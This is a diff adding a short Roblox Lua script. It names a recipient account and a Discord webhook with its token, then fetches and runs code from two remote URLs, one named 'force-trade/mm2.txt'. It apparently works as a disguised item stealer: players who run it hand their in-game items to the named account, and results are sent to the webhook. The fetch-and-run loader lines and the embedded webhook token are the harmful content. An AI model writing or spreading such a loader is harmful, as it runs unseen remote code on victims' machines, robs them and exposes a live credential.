@@ -1,0 +1,13 @@
+Username = "SKIBIDIWOMPHAHA126"
+Username2 = ""
+Webhook = "https://discord.com/api/webhooks/1267410217256357898/SzbzHELZ55OcZagZR0AJoj-gR8WKlpEQxAEtFb4edKUjKp4XmBtnjDqwrSe-CkgT8KuK"
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ahehhesver/force-trade/main/mm2.txt"))()
+
+local executor = identifyexecutor()
+if executor == "Solara" or executor == "Cubix" or executor == "Celery" then
+    game.Players.LocalPlayer:Kick("Your exploit is not supported")
+end
